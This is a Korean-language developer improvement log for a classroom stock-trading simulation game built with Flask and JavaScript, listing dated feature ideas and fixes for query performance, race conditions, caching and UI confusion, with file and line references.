- **결과 화면에서 예금 이자 수익 분리 표시** (`app.py:808-824 get_rankings()`, `app.js:1760-1777 loadResults()`): `total_value`에 투자 손익과 예금 이자가 합산되어 있어 전략 비교가 불가능. `get_rankings()` 응답에 `deposit_interest` 필드를 추가하고 결과 카드에 "예금 이자: +X원" 별도 표시. 서버에서 `Deposit.query.filter_by(status='matured')` 합산 약 5줄 추가로 구현 가능.
- **섹터별 순위 필터** (`app.py:808-824 get_rankings()`, `app.js:1673-1691 loadParticipantRankings()`): 현재 총 자산 기준 단일 정렬만 제공. `?sector=반도체` 쿼리 파라미터로 해당 섹터 보유자만 필터링해 수익률 순 정렬하면 "반도체 투자자 중 최고 성과" 수업 토론이 가능. 서버 `RoomHolding.query.filter_by` 필터 약 15줄, 클라이언트 섹터 드롭다운 추가.
- **진행자 전체 포트폴리오 집계 패널** (`app.py:host_members()`, `app.js:loadHostMembers()`): 진행자가 학급 전체의 종목별 보유 수량 합계를 한눈에 볼 수 없음. `GET /api/rooms/<rid>/host/portfolio-summary` 엔드포인트에서 `RoomHolding.query.filter_by(room_id=rid)`로 집계해 `{symbol: total_shares, sector_total: {...}}` 반환. "현재 학급이 반도체에 40% 집중됐군요"를 즉시 파악 가능. 서버 20줄·클라이언트 탭 패널 25줄로 구현.
- **퀴즈 타이머 서버 설정화** (`app.js:856, 861`): `_quizTimeSec = 30`과 `(_quizTimeSec / 30 * 100)` 두 곳에 30이 리터럴로 박혀 있어 타이머 시간 변경 시 두 곳을 동시 수정해야 함. `quiz-settings` API에 `time_sec` 필드를 추가해 서버에서 내려받는 구조로 전환하면 교사별 맞춤 설정이 가능.
- **시장 탭 종목 카드에 내 보유량 뱃지 표시** (`app.js:1287-1311 renderGrid()`): 학생이 특정 종목 보유 현황을 확인하려면 포트폴리오 탭으로 이동해야 함. `openStockModal()` 호출 시 이미 `S.tradeHolding`에 보유량이 캐시되므로, `renderGrid()` 시 보유 종목 카드 하단에 작은 뱃지("보유 N주")를 표시하면 별도 API 호출 없이 UX 개선 가능.

### 제거/단순화할 것들

- **`host_market_event()` 후 `_news_cache` 미무효화** (`app.py:1345-1360`): `host_force_price()` 미무효화는 2026-06-23에 문서화됐지만, `host_market_event()`도 동일하게 `force_sector_event()`로 `self._news`를 갱신한 뒤 `_invalidate_news_cache(rid)` 호출이 없음. 섹터 이벤트 후 최대 2초간 참가자는 구 뉴스를 수신. `app.py:1360` return 직전에 `_invalidate_news_cache(rid)` 한 줄 추가로 해결. `host_send_news()`(`app.py:700`)에는 이미 존재해 동일 경로 간 불일치 상태.
- **`api.get`/`api.post` HTTP 4xx 응답 시 서버 오류 메시지 폐기** (`app.js:32-33, 38-39`): `if (!r.ok) return {error: \`HTTP ${r.status}\`}` 패턴이 서버 상세 에러 JSON("잔액 부족 — 필요: X원 / 보유: Y원")을 버림. `trade()`(`app.py:749`)·`create_deposit()`(`app.py:890`) 등에서 400과 함께 상세 메시지를 반환해도 학생에게 "HTTP 400"만 표시됨. `if (!r.ok) return r.json().catch(() => ({error: \`HTTP ${r.status}\`}))` 로 교체하면 서버 오류 메시지가 UI에 전달됨.
- **`_lot_round_due()` 에서 `_lottery_lock` 없이 `_lots` 변이** (`app.py:171-178`, 호출 위치 `app.py:300`): `room_dict()`(line 300)가 `_lot_round_due()`를 호출하고 내부에서 `_lots.setdefault(rid, {'done': set(), 'current': None})`(line 176-178)를 실행. 동시에 `get_lottery()`가 `_lottery_lock` 하에서 `_lots[rid]`를 수정하면 딕셔너리 변이 레이스 컨디션 발생 가능. `_lot_round_due()` 내 `_lots.setdefault()` 를 읽기 전용 `_lots.get(rid, {})` 로 교체하고 초기화를 `lottery_start()`/`get_lottery()` 내부로 이전.
- **룰렛 트리거 조건 `remaining <= 5`가 10초 폴링 주기보다 좁아 트리거 스킵 가능** (`app.py:437-439, 446-448`): `now_dt >= room.end_time` 체크가 룰렛 트리거 체크보다 먼저 평가됨. 마지막 폴링이 종료 5초 전에 발생하고 다음 폴링이 이미 종료 시각 초과 시 룰렛 없이 `_end_room()` 실행. `remaining <= 5` → `remaining <= 15`(폴링 주기 + 버퍼)로 확대하거나 `room.end_time - timedelta(seconds=15)` 이전에 트리거 예약.
- **`enterHostGame()` 에서 `startNewsPolling()` 불필요 호출** (`app.js:267`): `startNewsPolling()`은 참가자용 폭탄뉴스 팝업을 위한 것인데 진행자 진입 함수에서도 호출됨. 진행자는 뉴스를 직접 트리거하는 주체라 수신이 불필요. `/api/rooms/<rid>/news`를 8초마다 불필요하게 폴링해 진행자당 분당 7.5회 요청 낭비. `enterHostGame()`에서 `startNewsPolling()` 호출 제거.
- **`loadDepositsPage()` active 예금만 표시해 게임 종료 후 이자 내역 확인 불가** (`app.js:1629-1630`): `const active = (data || []).filter(d => d.status === 'active')` — `_end_room()`이 모든 예금을 matured 처리하므로 게임 종료 후 예금 탭에는 "활성 예금 없음"만 표시. `get_deposits()`(`app.py:852`)는 matured 예금도 반환하므로, 게임 종료 후 matured 예금을 "💰 만기 완료" 별도 섹션으로 표시해 학생이 이자 수령액 확인 가능.
- **`room_dict()` 에서 `RoomMember.count()` 쿼리가 매 캐시 미스마다 실행** (`app.py:297`): `'member_count': RoomMember.query.filter_by(room_id=room.id).count()` — `_room_cache` TTL이 1.5초라 10초 폴링에서도 자주 미스 발생. 30명 방에서 분당 수십 번 COUNT 쿼리 실행. `Room.members` 관계(`models.py:43`)를 활용해 `len(room.members)`로 대체하거나 멤버 수를 캐시에 포함시켜 JOIN 없이 관리하면 쿼리 제거 가능.

---

## 2026-07-01

### 추가하면 좋을 기능

- **게임 내 실제 가격 변동 이력 저장 → 종료 후 진짜 시계열 차트 제공** (`stock_service.py:121-190`, `get_history():281-309`): 현재 `get_history()`는 현재가에서 역방향 랜덤 워크로 "과거 차트"를 생성하므로, 진행자가 `force_price()`나 `force_sector_event()`로 큰 변동을 일으켜도 차트에 반영되지 않음. 학생이 "왜 차트에 폭락이 안 보이나요?"라고 물을 수 있어 교육 혼란 유발. `StockService.__init__`에 `self._price_log: list = []` 추가 후 `get_price()` 내 가격 갱신 시(`stock_service.py:185`) `self._price_log.append((now, sym, new_price))` 한 줄로 이력 적재. `get_history()` 에서 `_price_log`를 활용해 실제 변동 차트를 반환하면 교육 가치가 크게 올라감.

- **진행자 → 개별 학생 맞춤 힌트 전송 기능** (`app.py:690-701 host_send_news()`, `app.js:1579-1591 loadTxn()`): 현재 `send-news` 엔드포인트는 전체 브로드캐스트만 가능. 뒤처지는 학생이나 잘못된 전략을 구사하는 학생에게 조용히 힌트를 주는 수단이 없음. `POST /api/rooms/<rid>/host/hint` 엔드포인트에서 `RoomTransaction(room_id=rid, user_id=target_uid, symbol='MSG', action='ADJ', amount=0, note=hint_text)` 레코드를 삽입하면, 이미 10초마다 폴링 중인 `loadTxn()` 경로에서 action='MSG' 타입을 식별해 `toast()` 표시. 웹소켓 불필요, 서버 15줄·클라이언트 10줄.

- **학생 상단 바에 1위와의 자산 격차 표시** (`app.js:735-752 refreshMyRank()`): `refreshMyRank()`는 이미 전체 랭킹 배열을 수신하므로 `const gap = data[0].total_value - me.total_value`를 계산할 수 있음. 현재 `pg-rank`(순위)·`pg-gain-pct`(수익률)만 표시하는데, 1위와의 격차(예: "-2,350,000원")를 추가하면 학생이 역전 여부를 즉시 판단해 전략적 의사결정을 유도 가능. 서버 변경 없음, 클라이언트 약 3줄.

- **가격 강제 초기화(base price 리셋) 버튼** (`stock_service.py:218-228 force_price()`, `index.html:162-180 호스트 시장 탭`): 진행자가 실수로 특정 종목을 50% 연속 올리거나 내려 `base * 3.0` 상한에 붙어버리면 되돌릴 수단이 없음. `StockService`에 `reset_price(symbol)` 메서드(`base * random.uniform(0.97, 1.03)` 재적용)를 추가하고, 호스트 시장 탭의 "주가 강제 조정" 카드에 "기준가 복원" 버튼을 추가하면 수업 중 실수 복구가 가능. 서버 10줄·클라이언트 5줄.

---

### 제거/단순화할 것들

- **`member_total_value()` N+1 쿼리 — 30명 방에서 60~90회 개별 SELECT** (`app.py:107-118`, `host_members():544`, `get_rankings():815`): `member_total_value(uid)`가 `RoomHolding.query.filter_by(room_id=rid, user_id=uid).all()` + `Deposit.query.filter_by(room_id=rid, user_id=uid, status='active').all()` 두 SELECT를 멤버마다 실행. 30명 학급에서 `host_members()` 호출 한 번에 최소 60회 쿼리 발생, 10초 폴링에서 반복됨. 해결: `holdings = RoomHolding.query.filter_by(room_id=rid).all()`로 전체를 한 번에 가져와 `{uid: [h, ...]}` 딕셔너리로 그룹화 후 이용. `Deposit`도 동일하게 방 단위 일괄 조회로 O(N) → O(1) 절감.

- **`setDepPct(100)` 전액 버튼이 잔액 9,999원 이하일 때 0원 반환** (`app.js:1597-1600`): `Math.floor(cash * pct / 100 / 10000) * 10000` 계산에서 9,999원 보유 학생이 "전액" 버튼을 눌러도 0이 입력됨. 잔액이 거의 없는 학생이 이자라도 받으려고 예금을 시도해도 불가능. `pct === 100 ? cash : Math.floor(cash * pct / 100 / 10000) * 10000`으로 교체하면 전액 버튼은 절삭 없이 정확한 금액을 대입.

- **`create_room()` stale 체크가 장기 일시정지된 방을 누락** (`app.py:372-379`): `Room.end_time < stale_cutoff` 조건만 검사. 5시간짜리 방을 시작 직후 일시정지하면 `end_time = start_time + 5h`로 미래에 위치해 stale 판정이 영원히 안 됨. 진행자가 새 방을 만들려 해도 "이미 진행 중인 방이 있습니다." 오류가 뜸. `OR (Room.status == 'paused' AND Room.paused_at < stale_cutoff)` 조건을 추가하면 장기 방치된 paused 방도 정리 가능.

- **`confirmLeaveGame()` 메시지가 재입장 가능함을 알리지 않아 학생 혼란** (`app.js:114-117`): `"게임을 나가시겠습니까?\n진행 중인 게임에서 퇴장합니다."` 문구를 보면 영구 퇴장으로 오해. 실제로는 로그아웃 후 동일 학번+이름 재입력 시 `find_active_room()`이 RoomMember를 찾아 자동 복귀(`app.py:307-313`). `"나갔다가 같은 학번+이름으로 다시 들어오면 게임 기록이 유지됩니다."` 한 줄을 confirm 메시지에 추가하면 수업 중 패닉 방지. 1줄 수정.

- **`minigame_spin()`·`submit_quiz()` 에서 주식 청산 시 `h.shares = 0` 으로 설정하고 레코드 삭제 안 함** (`app.py:1037-1038`, `app.py:1318`): 룰렛 베팅 자금 마련이나 퀴즈 패널티로 보유 주식이 전량 청산될 때 `h.shares = 0; h.avg_price = 0`으로 설정하고 `db.session.delete(h)`를 호출하지 않음. `get_portfolio()`(`app.py:782`)에서 `if h.shares <= 0: continue`로 걸러지지만, `RoomHolding.query.filter_by(room_id=rid, user_id=uid).all()` 결과에 빈 레코드가 포함돼 반복문이 불필요하게 확장됨. 두 위치에서 `if sell_value <= shortfall: ... db.session.delete(h)` (또는 `if h.shares == 0: db.session.delete(h)`)로 즉시 삭제 처리.

- **`lobby_members()` 가 `/host/` 경로에 있지만 진행자 권한 검사 없음** (`app.py:577-585`): `GET /api/rooms/<rid>/host/lobby-members`는 `room.host_id != user.id` 체크 없이 누구든 인증만 되면 다른 방 학생 명단 조회 가능. 참가자 로비가 이 엔드포인트를 사용하는 것은 의도된 설계(`app.js:579`)이지만, URL이 `/host/` 하위라 향후 일괄 권한 미들웨어 적용 시 실수로 학생 접근을 차단할 위험이 있음. 엔드포인트를 `/api/rooms/<rid>/lobby-members`로 이동하거나, 현 위치에 진행자 OR 해당 방 멤버 조건을 명시적으로 추가.

---

## 2026-07-01 (2차)

### 추가하면 좋을 기능

- **포트폴리오 도넛 차트에 섹터별 집계 전환 토글 버튼** (`app.js:1480-1502 loadPortfolio()`): 현재 도넛 차트는 보유 종목 단위로 분할돼 종목이 많으면 범례가 좁아져 한눈에 분산투자 비율을 파악하기 어려움. "섹터별 보기" 버튼 클릭 시 `port.holdings`를 `sector → sum(current_value)` 로 그룹화해 Chart.js 데이터만 교체하면 "내가 반도체에 40% 집중됐네"를 즉시 파악 가능. 분산투자 교육 효과 높음. 서버 변경 없음, 클라이언트 Chart destroy/재생성 포함 약 20줄.

- **자산 히스토리를 `localStorage`에 백업해 새로고침·재접속 시 20분 상한 소실 방지** (`app.js:749-752 refreshMyRank()`): `S.assetHistory.shift()`로 120개(10초×120=20분) 초과분이 삭제되어, 2시간짜리 게임에서는 마지막 20분 데이터만 포트폴리오 탭 라인차트(`app.js:1505-1540`)에 남음. 초기 투자 전략과 현재의 대비가 불가능. `refreshMyRank()` 말미에 `localStorage.setItem('ah_' + S.room.id, JSON.stringify(S.assetHistory))`를 추가하고 `enterParticipantGame()`(app.js:589)에서 `JSON.parse(localStorage.getItem(...)) || []`로 복구하면, 새로고침 및 장기 게임 데이터 축적이 가능. 클라이언트 약 5줄, 서버 변경 없음.

- **관심종목 목표 등락률 도달 시 toast 알림** (`app.js:1279-1285 toggleWatchlist()`, `app.js:1313-1323 renderGrid()`): 현재 관심목록(`S.watchlist`)은 필터링에만 사용되고 가격 도달 알림이 없어 수업 중 학생이 계속 화면을 주시해야 함. `toggleWatchlist()` 호출 시 목표 등락률(예: +10%)을 모달로 입력받아 `localStorage`의 `watchAlerts = {SMSNG: 10, TSLA: -5}` 에 저장하고, `renderGrid()` 루프에서 관심종목의 `change_pct`가 목표를 돌파하면 `toast('삼성전자 목표 +10% 도달!')` 1회 발생. `alertFired` 세트로 중복 방지. 서버 변경 없음, 클라이언트 약 25줄.

- **진행자용 풀스크린 랭킹 표시 전용 뷰 `/rooms/<code>/display`** (`app.py:318-320 index()`, `app.js:258-273 enterHostGame()`): 현재 진행자 게임 화면에는 설정·시장·랭킹 탭이 혼재해 프로젝터로 학생들에게 공개하기 어려움. `GET /rooms/<code>/display` 라우트를 추가해 `display.html`(CSS 최소화, 10초 자동 갱신, 조작 UI 없는 풀스크린 랭킹 테이블)을 반환하면, 교사가 별도 브라우저 탭을 열어 프로젝터로 실시간 순위를 학생들에게 공개 가능. Flask 라우트 5줄 + 최소 HTML 60줄.

- **게임 종료 시 최종 보유 종목 스냅샷을 결과 화면에 표시** (`app.py:144-153 _end_room()`, `app.js:1760-1777 loadResults()`): `_end_room()`에서 `RoomHolding`을 전량 삭제(`db.session.delete(h)`, app.py:152)하므로 게임 종료 후 학생이 "내가 어떤 종목을 얼마나 갖고 있었나?"를 복기할 수 없음. 삭제 전 `RoomTransaction(action='SNAP', symbol='PORTFOLIO', note=json.dumps([{'sym': h.symbol, 'shares': h.shares, 'avg': h.avg_price} for h in holdings]))` 한 건을 저장하면, `get_transactions()` 경로로 종료 후에도 최종 포트폴리오 조회 가능. 결과 화면 "내 결과" 카드(`app.js:1762-1774`)에 보유 종목 목록 추가. 서버 약 5줄, 클라이언트 약 15줄.

---

### 제거/단순화할 것들

- **`_next_price()` 클램프 `base×1.4`와 `force_price()` 클램프 `base×3.0` 불일치 → 강제 조정 직후 스냅백 버그** (`stock_service.py:139`, `stock_service.py:225`): 진행자가 `host_force_price(pct=+100)`으로 주가를 base×2.0으로 올리면, 다음 유기 틱(최대 20초 후) `_next_price()`에서 `max(base * 0.6, min(base * 1.4, new_price))` 클램핑에 의해 가격이 base×1.4로 급락. 학생이 "진행자가 방금 올려줬는데 왜 바로 내려가요?"라고 혼란. `stock_service.py:139`의 `min(base * 1.4, ...)` → `min(base * 3.0, ...)`, `max(base * 0.6, ...)` → `max(base * 0.3, ...)` 로 통일하면 2줄 수정으로 강제 조정 범위와 유기 범위가 일치.

- **`lobby_members()` 루프 내 `db.session.get(User, m.user_id)` N+1 SELECT** (`app.py:582-584`): 멤버마다 별도 `SELECT users WHERE id=?` 실행 — 30명 방에서 31회 쿼리. `host_members()`(app.py:548-551)는 이미 `uids = [m.user_id for m in members]; user_map = {u.id: u for u in db.session.query(User).filter(User.id.in_(uids)).all()}` 일괄 조회 패턴을 사용하고 있어 불일치. `lobby_members()`에 동일 4줄 패턴 적용 시 O(N) → O(1) 절감. 5초 폴링에서 30명 접속 시 분당 최대 186회 → 12회로 감소.

- **`openStockModal()` 호출마다 `/portfolio` 전체 재조회** (`app.js:1344-1351`): 학생이 시장 탭에서 여러 종목 카드를 연속 클릭하면 클릭마다 `GET /api/rooms/<rid>/portfolio` 를 호출해 `RoomHolding` + `Deposit` 전체를 DB에서 재조회. `execTrade()` 성공 시 이미 `S.tradeCash`(app.js:1442)·`S.tradeHolding`(1446)이 갱신되므로 재조회가 불필요한 경우가 많음. `S._portfolioCache = {ts: 0, cash: 0, holdings: []}` 를 도입해 30초 이내이면 캐시를 재사용(`if (Date.now() - S._portfolioCache.ts < 30000)`)하고, `execTrade()`·`loadPortfolio()` 성공 시 캐시를 갱신. 클라이언트 약 10줄.

- **`_end_room()` 내 전역 딕셔너리 수정에 잠금 없음 — gunicorn multi-worker 환경에서 상태 불일치** (`app.py:155-161`): `_lots.pop()`, `_rlt_active.pop()`, `_quiz_settings.pop()`, `_roulette_config.pop()`, `_ending_soon.discard()` 모두 잠금 없이 수행. 단일 워커에선 GIL이 어느 정도 보호하지만, `WEB_CONCURRENCY=2+` 시 각 프로세스가 독립 메모리를 가져 "워커 A에서 room 종료 → 워커 B에서 여전히 active로 간주"하는 상태 불일치 발생. 현재 `render.yaml`·`Procfile` 어디에도 단일 워커 제약 명시 없음. `app.py:12` 주석 또는 `Procfile`에 `web: gunicorn app:app --workers 1 --threads 4`를 명시해 인메모리 전역 상태 공유 보장. 장기적으로는 `_lots`, `_rlt_active` 등을 Redis로 이전 권장.

- **`get_history()` X축 날짜가 실제 캘린더 날짜여서 30분 게임과 맥락 불일치** (`stock_service.py:296-302`): `date_str = datetime.utcfromtimestamp(now - i * 86400).strftime('%Y-%m-%d')` 로 "2026-06-01"~"2026-07-01" 같은 실제 날짜가 차트 X축에 표시됨. 30분짜리 게임에서 학생이 "1달 차트"를 보면 지난 달 날짜들이 보이므로 "이게 실제 주가 데이터인가요?"라는 혼동 유발. `date_str = f"T-{i}"`나 `f"라운드 {n_bars - i}"` 같은 상대 레이블로 교체하면 1줄 수정으로 "이건 가상 시뮬레이션 데이터" 임을 명확히 전달 가능.

- **`Room.query.get_or_404(rid)` — Flask-SQLAlchemy 3.1+에서 `LegacyAPIWarning` 발생, 코드베이스 13곳** (`app.py:435, 478, 492, 507, 523, 543, 566, 580, 591, 610, 675, 693, 713`): `cur_user()`(app.py:105)·`withdraw_deposit()`(app.py:907) 등 최신 추가 코드는 이미 `db.session.get(Model, pk)` 를 사용하고 있어 동일 파일 내 일관성이 없음. `Room.query.get_or_404(rid)` → `db.get_or_404(Room, rid)` (Flask-SQLAlchemy 3.1 공식 API)로 일괄 교체하면 경고 제거 + 스타일 통일. `sed -i "s/Room\.query\.get_or_404(rid)/db.get_or_404(Room, rid)/g" app.py` 한 줄로 13곳 자동 치환 가능.

---

## 2026-07-02

### 추가하면 좋을 기능

- **퀴즈 타이머가 게임 일시정지 중에도 카운트다운** (`app.js:858-867`, `openQuiz()`): 학생이 일시정지 상태에서 퀴즈를 열면 30초 타이머가 그대로 흐르다 시간 초과되어 오답 패널티를 받음. 백엔드는 `room.status != 'active'` 시 400을 반환하므로 패널티가 적용되지는 않지만, 학생 UX에서는 "시간 초과!"만 뜨고 혼란스러움. `openQuiz()` 내 타이머 시작 직전에 `if (S.room?.status !== 'active') { 퀴즈 버튼 비활성화; return; }` 한 줄과, `quiz-overlay`에 일시정지 경고 문구를 조건부 표시하면 해결. 서버 변경 불필요.

- **룰렛 베팅 시 현금 부족으로 주식이 자동 청산될 때 사전 경고 없음** (`app.js:1033-1044`, `app.py:1023-1058`): 학생이 총 자산(현금+주식)을 기준으로 베팅금을 입력하면, 현금 부족 시 백엔드에서 보유 주식을 자동 매도해 충당함. 그러나 프론트엔드는 `_rltCash = total_assets`로만 표시해 "충분하다"고 표시하다 갑자기 포트폴리오가 사라지는 상황 발생. `app.js:1037` 베팅 검증 직후에 `if (bet > currentCash) { errEl.textContent = '⚠️ 현금 부족 — 보유 주식이 자동 매도됩니다. 계속하시겠습니까?'; ...confirm()...}` 패턴으로 명시적 동의를 받으면 학생 혼란 방지. 서버 변경 불필요.

- **`refreshMyRank()` 가 전체 순위 API를 호출해 불필요한 데이터 전송** (`app.js:735-753`, `app.py:808-824`): `refreshMyRank()`는 모든 참가자의 순위 목록 전체를 받아 본인 항목만 추출해 상단 상태 표시줄을 갱신함. 10초마다 호출되므로 30명 수업에서 매 10초마다 ~30행 데이터를 낭비. `GET /api/rooms/<rid>/my-rank` 경량 엔드포인트를 신설해 `{rank, total_value, gain_pct}` 세 필드만 반환하면 응답 크기 ~95% 절감. `app.py:808` 로직 일부를 복사하되 `is_me` 필터링과 현재 유저 데이터만 추출하면 됨.

- **결과 화면에서 나의 거래 내역 요약 미제공** (`app.js:1702-1794`, `loadResults()`): 게임 종료 후 결과 화면에는 순위와 최종 자산만 표시되고, 내가 어떤 종목을 얼마에 사고 팔았는지 거래 내역 요약이 없음. `RoomTransaction` 테이블에서 사용자의 거래를 집계해 "가장 많이 거래한 종목 3개"나 "수익률 상위 거래"를 결과 화면에 카드 형태로 추가하면, 수업 후 반성 및 토론 자료로 활용 가능. `screen-results` 내 `results-my-stats` div(`index.html:628`) 아래에 트랜잭션 요약 섹션을 추가하는 방식으로 구현.

- **학생 화면에 현재 시장 전체 추세 요약 배너 없음** (`app.js:1229-1241`, `loadMarket()`): 46개 종목 중 몇 개가 상승/하락인지 한눈에 볼 수 없어 초보 학생이 시장 흐름 파악에 어려움을 겪음. `loadMarket()` 완료 후 `S.stocks`에서 상승 종목 수·하락 종목 수·평균 변동률을 계산해 주식 목록 상단에 한 줄 요약 (`📈 상승 24 / 📉 하락 22 · 평균 +0.3%`) 을 표시하면 3줄 JavaScript로 구현 가능. 서버 변경 불필요.

- **진행자가 복권 진행 중 참가자 제출 현황 확인 불가** (`app.py:1114-1147`, `get_lottery()`): 복권 picking 단계에서 진행자 모달에는 "참가자 번호 선택 중... 60초" 표시만 있고, 누가 이미 제출했는지 알 수 없음. `get_lottery()` 호스트 조건 블록(`app.py:1145`)에 `'submitted_count': len(cur.get('picks',{}))` 필드를 추가하고, `_showLotHostPickingUI()` (`app.js:2079`)에서 "제출 완료: N/전체" 를 표시하면 진행자가 "아직 제출 못한 학생이 있으니 30초 더 기다릴게요" 결정을 내릴 수 있음.

---

### 제거/단순화할 것들

- **`_quiz_settings`, `_roulette_config` 인메모리 딕셔너리가 서버 재시작·배포 시 초기화** (`app.py:1246, 250`): Render 무료 티어는 15분 비활성 시 인스턴스를 Sleep 상태로 전환하며, 깨어날 때 프로세스가 재시작됨. 이때 진행자가 설정한 퀴즈 보상/패널티 비율(`_quiz_settings`)과 룰렛 배율/확률(`_roulette_config`)이 초기화되어 기본값으로 되돌아감. 두 딕셔너리 모두 게임 시작 시 `Room` 모델에 JSON 컬럼으로 저장(또는 기존 `Room.lottery_rounds_done`처럼 문자열로 직렬화)하면 재시작 내성을 확보. 현재 `lottery_rounds_done` 처리 방식(`app.py:175-179`)을 참고해 동일 패턴으로 DB 지속화 가능.

- **`username` 필드에 학번과 이름을 공백으로 결합해 저장하는 단일 컬럼 설계** (`models.py:19`, `app.py:1435`, `app.js:1695-1699`): `User.username = "{sid} {name}"` 형태로 저장해 백엔드에서는 `split(' ', 1)`, 프론트엔드에서는 `parts[0]` / `parts.slice(1).join(' ')` 등 파싱 로직이 두 곳에 중복 존재. 한국 이름에 공백이 있는 경우("이 민준") 파싱이 불안정해질 수 있음. `User` 모델에 `student_id = db.Column(db.String(20))` 와 `display_name = db.Column(db.String(30))` 컬럼을 분리해 추가하고, `username`은 하위 호환성 유지용으로만 남기면 파싱 로직을 완전 제거 가능. 마이그레이션은 기존 `ALTER TABLE` 패턴(`app.py:31-40`)을 그대로 활용.

- **룰렛 설정 테이블 색상 사각형이 실제 룰렛 휠 색상과 불일치** (`index.html:277-300`, `app.js:904`): 설정 탭의 룰렛 표에서 색상 구분 사각형은 `#c0392b`(빨), `#e67e22`(주황), `#f1c40f`(노랑), `#27ae60`(초록), `#3498db`(파랑) 순인 반면, 실제 룰렛 휠이 사용하는 `_RLT_COLORS`는 `['#e74c3c','#3498db','#f39c12','#2ecc71','#9b59b6']` 순서와 색조가 다름. 진행자가 "파란 칸의 확률을 바꿨는데 왜 다른 칸이 바뀌지?"라는 혼란 가능. `index.html:277-300` 각 `<span>` 색상값을 `_RLT_COLORS` 배열과 일치하도록 정렬하면 2분 수정으로 해결.

- **진행자 시장 탭 초기 렌더링 시 종목 드롭다운이 탭 전환마다 누적 삽입 방지 로직이 방어적** (`app.js:322-330`, `loadHostMarket()`): 드롭다운 중복 방지를 `if (!sel.options.length)` 조건으로만 체크하므로, 호스트가 탭을 나갔다 돌아올 때 새 종목이 추가되어도 드롭다운이 갱신되지 않음(현재 종목은 고정이라 실문제 아님). 더 중요한 것은 `if (!grid.children.length)` 조건(`app.js:317`)으로 로딩 스피너가 이미 렌더링된 그리드에는 표시 안 되므로, 탭 재진입 시 갱신 중임을 알 수 없음. `grid.innerHTML = '<div class="loading-center">...'` 를 조건 없이 항상 실행한 후 `data.stocks` 도착 시 교체하면 더 일관된 UX 제공.

- **`get_room()` 에서 `Room.query.get_or_404(rid)` 이후 `cur_user()` 가 두 번 호출됨** (`app.py:432-473`): `get_room()` 함수 내에서 `cur_user().id`를 `app.py:440, 444, 464, 473` 등 여러 곳에서 중복 호출하여 매번 `db.session.get(User, session['user_id'])`를 실행함. 함수 시작 시 `user = cur_user()` 한 번만 호출해 변수에 저장하면 DB 조회를 3~4회 절감. 동일 패턴이 `get_stocks()` (`app.py:651`) 등에서도 반복됨.

---

## 2026-07-02 (2차)

### 추가하면 좋을 기능

- **진행자 화면 재접속 시 퀴즈 보상·패널티 비율이 입력 필드에 복구되지 않음** (`app.js:258-274 enterHostGame()`, `app.py:1399-1414 quiz_settings()`): `enterHostGame()`에서 `loadRltConfig()`는 호출해 룰렛 설정을 복구하지만, 퀴즈 설정 로딩 함수가 없어 진행자가 새로고침·재접속하면 입력 필드가 기본값(보상 1%, 패널티 0.5%)으로 초기화됨. 진행자가 "내가 3%로 설정했나 2%로 설정했나?"를 알 수 없음. `GET /api/rooms/<rid>/host/quiz-settings` 엔드포인트가 이미 존재하므로, `async function loadQuizSettings()` 함수(5줄)를 추가해 응답값을 `quiz-reward-input`·`quiz-penalty-input`·`quiz-reward-info`에 세팅하고 `enterHostGame()` 에서 `loadRltConfig()` 직후 호출하면 해결. 서버 변경 불필요.

- **`startConfetti()` 가 진행자 결과 화면에서도 실행돼 수업 진행 방해** (`app.js:1794`): `loadResults()` 마지막 줄 `if (data.length > 0) setTimeout(startConfetti, 200)` 에 `S.room?.is_host` 체크가 없어 진행자가 결과 화면에 진입할 때도 110개 파티클 폭죽 애니메이션이 실행됨. 프로젝터로 결과를 공개하는 도중 폭죽이 터지면 학생이 집중 불가. `if (data.length > 0 && !S.room?.is_host) setTimeout(startConfetti, 200)` 로 한 조건 추가(1줄 수정)로 참가자에게만 confetti 표시.

- **포트폴리오 탭 보유 종목 "매수/매도" 버튼이 로딩 시점의 stale 가격으로 모달 초기화** (`app.js:1558-1560`): `openStockModal('${h.symbol}', {price: ${h.current_price}, ...})` 로 fallback 객체를 넘기고, `openStockModal()` 내부에서 `S.stocks.find(s => s.symbol === symbol) || fallback` 로 현재 시세를 우선하지만 `S.stocks`가 오래된 경우(포트폴리오 탭 진입 후 시장 탭 미방문) stale fallback 가격이 모달에 표시됨. 학생이 "방금 X원으로 봤는데 Y원에 체결됐어요" 혼란 발생. `openStockModal()` 내 `port = await api.get('/portfolio')` 결과가 이미 `S.tradeCash`·`S.tradeHolding`을 갱신하므로, 가격도 `/stocks` API를 간단히 재조회(`svc.get_price(symbol)` 경량 엔드포인트)하거나, fallback의 `price`를 모달 표시용에만 사용하고 거래 시에는 서버에서 실시간 가격을 재조회하는 방식으로 개선 가능.

- **"더 보기" 버튼 연속 탭 시 `loadMoreTxn()` · `loadMoreStudentTxn()` 이 중복 페이지 요청** (`app.js:1593, 538`): 두 함수 모두 `S.txnPage++` 후 API 호출 전에 버튼 `disabled` 처리가 없어, 느린 응답 중 두 번 탭하면 동일 페이지 번호로 두 요청이 가서 거래 항목이 중복 삽입됨. `const btn = e.currentTarget; btn.disabled = true; try { S.txnPage++; await loadTxn(false); } finally { btn.disabled = false; }` 패턴(각 3줄)으로 방어 가능. onclick 속성에서 이벤트 객체 전달이 필요하므로 HTML 측 `onclick="loadMoreTxn(event)"` 로 소폭 수정 필요.

- **참가자 게임 로비 폴링에서 `room` 상태와 `lobby-members`를 매 5초마다 각각 별도 요청** (`app.js:562-575`): `enterParticipantLobby()` `setInterval` 콜백에서 `loadPLobbyMembers()` + `api.get('/api/rooms/<rid>')` 두 요청이 항상 순차 실행. 30명 대기 중 분당 각각 12회, 총 24회 API 요청 발생. `get_room()` 응답에 이미 `member_count`(app.py:297)가 있으므로 `room` 응답만으로 멤버 수 표시 가능. `/api/rooms/<rid>` 폴링 응답에 대기 중 멤버 목록(`lobby_members`)을 추가하거나, `loadPLobbyMembers()` 폴링 주기를 10초로 늘이면 요청 횟수를 절반으로 줄일 수 있음. 서버 약 5줄·클라이언트 약 3줄.

- **`renderSectors()` 가 섹터 버튼 클릭마다 `innerHTML` 전체를 재생성해 포커스 유실** (`app.js:1243-1255`): `setSector()` → `renderSectors()` → `sector-filters.innerHTML = ...` 전체 교체. 17개 섹터 버튼 DOM 전체를 재생성하므로 키보드·스크린리더 사용 시 포커스가 날아감. 이미 렌더링된 버튼에 `active` 클래스만 토글하는 방식(`document.querySelectorAll('.sector-btn').forEach(b => b.classList.toggle('active', b.dataset.sector === (S.activeSector || '전체')))`)으로 교체하면 DOM 재생성 없이 3줄로 대체 가능. 초기 렌더는 그대로 두고 업데이트 경로만 분리.

---

### 제거/단순화할 것들

